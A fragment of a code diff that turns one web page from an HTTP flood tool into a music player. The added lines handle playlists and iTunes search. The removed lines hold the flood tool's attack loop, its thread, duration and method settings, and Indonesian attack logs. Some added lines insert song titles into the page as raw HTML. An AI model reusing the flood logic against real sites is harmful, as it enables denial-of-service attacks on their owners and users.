+            modal.classList.add('active');
+        }
+
+        function closePlaylistModal() {
+            document.getElementById('playlist-modal').classList.remove('active');
+            pendingSong = null;
+        }
+
+        function addToExistingPlaylist(name) {
+            if (!pendingSong) return;
+            const playlists = getCurrentUserPlaylists();
+            if (!playlists[name]) playlists[name] = [];
+            if (playlists[name].some(s => s.title === pendingSong.title && s.artist === pendingSong.artist)) {
+                utils.toast('Song already in playlist');
+                closePlaylistModal();
                 return;
             }
+            playlists[name].push(pendingSong);
+            saveCurrentUserPlaylists(playlists);
+            utils.toast(`Added to "${name}"`);
+            closePlaylistModal();
+            updateSidebarUI(); // ✅ refresh sidebar
+        }
 
-            stopFlag = false;
-            totalRequests = 0;
-            totalErrors = 0;
-            startTime = Date.now();
-            
-            const threads = parseInt(document.getElementById('threads').value);
-            const duration = parseInt(document.getElementById('duration').value) * 1000;
-            const method = document.getElementById('method').value;
-            
-            document.getElementById('attackBtn').style.display = 'none';
-            document.getElementById('stopBtn').style.display = 'block';
-            document.getElementById('logBox').innerHTML = '';
-            
-            log(`🚀 MULAI SERANGAN KE: ${target}`);
-            log(`🔥 Threads: ${threads} | ⏱️ Duration: ${duration/1000}s | 🌊 Method: ${method}`);
-            log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
-            
-            let floodFn;
-            if (method === 'GET') floodFn = floodGET;
-            else if (method === 'POST') floodFn = floodPOST;
-            else floodFn = floodRANDOM;
-            
-            // Jalankan per thread
-            for (let i = 0; i < threads; i++) {
-                (async function loop() {
-                    while (!stopFlag) {
-                        await floodFn(target);
-                    }
-                })();
-            }
-            
-            // Update stats setiap detik
-            attackInterval = setInterval(() => {
-                updateStats();
-                if (totalRequests % 1000 === 0 && totalRequests > 0) {
-                    log(`📤 ${totalRequests.toLocaleString()} requests terkirim...`);
+        function addToNewPlaylist() {
+            const input = document.getElementById('new-playlist-input');
+            const name = input.value.trim();
+            if (!name) return utils.toast('Enter a name');
+            const playlists = getCurrentUserPlaylists();
+            if (playlists[name]) return utils.toast('Playlist already exists');
+            playlists[name] = [];
+            saveCurrentUserPlaylists(playlists);
+            addToExistingPlaylist(name);
+            input.value = '';
+        }
+
+        // ========== SEARCH LOGIC ==========
+        async function searchMusic() {
+            const query = document.getElementById('search-input').value.trim();
+            const list = document.getElementById('song-list');
+            const loading = document.getElementById('loading');
+            if (!query) return utils.toast("Please enter a song name!");
+            list.innerHTML = '';
+            loading.style.display = 'block';
+            document.getElementById('search-input').blur();
+
+            try {
+                const res = await fetch(`https://itunes.apple.com/search?term=${encodeURIComponent(query)}&media=music&limit=15`);
+                const data = await res.json();
+                loading.style.display = 'none';
+                if (data.resultCount === 0) {
+                    list.innerHTML = '<div class="status-msg">No results found.</div>';
+                    return;
                 }
-            }, 1000);
-            
-            // Auto stop
-            setTimeout(() => {
-                stopAttack();
-                log(`✅ SERANGAN SELESAI. Total: ${totalRequests.toLocaleString()} requests`);
-            }, duration);
+                data.results.forEach((song, index) => {
+                    const artwork = song.artworkUrl100 ? song.artworkUrl100.replace('100x100', '300x300') : 'https://via.placeholder.com/300';
+                    const title = song.trackName;
+                    const artist = song.artistName;
+                    const preview = song.previewUrl;
+                    const card = document.createElement('div');
+                    card.className = 'song-item anim-element';
+                    card.style.animationDelay = `${index * 0.05}s`;
+                    card.innerHTML = `
+                        <img src="${artwork}" class="song-img" onclick="playSong('${preview}','${escAttr(title)}','${escAttr(artist)}','${artwork}')">
+                        <div class="song-info" onclick="playSong('${preview}','${escAttr(title)}','${escAttr(artist)}','${artwork}')">
+                            <div class="song-title">${title}</div>
+                            <div class="song-artist">${artist}</div>
+                        </div>
+                        <div class="song-actions">
+                            <button class="song-action add-playlist-btn" title="Add to playlist" onclick="event.stopPropagation(); openPlaylistModal({title:'${escAttr(title)}', artist:'${escAttr(artist)}', artwork:'${artwork}', previewUrl:'${preview}'})">
+                                <i class="fa-solid fa-plus"></i>
+                            </button>
+                        </div>
+                    `;
+                    list.appendChild(card);
+                });
+                document.getElementById('search-card').style.display = 'block';
+            } catch (e) {
+                loading.style.display = 'none';
+                list.innerHTML = '<div class="status-msg" style="color:#ff5555;">Connection Error.</div>';
+                console.error(e);
+            }
         }
 
-        function stopAttack() {
-            stopFlag = true;
-            clearInterval(attackInterval);
-            document.getElementById('attackBtn').style.display = 'block';
-            document.getElementById('stopBtn').style.display = 'none';
-            updateStats();
-            log('🛑 SERANGAN DIHENTIKAN!');
-        }
+        document.getElementById('search-input').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') searchMusic();
+        });
+
+        // ========== INIT ==========
+        window.addEventListener('load', () => {
+            setupMediaSession();
+            const storedUser = sessionStorage.getItem('currentUser');
+            if (storedUser) {
+                currentUser = storedUser;
+            }
+            updateUIForAuth();
+        });
     </script>
 </body>
 </html>
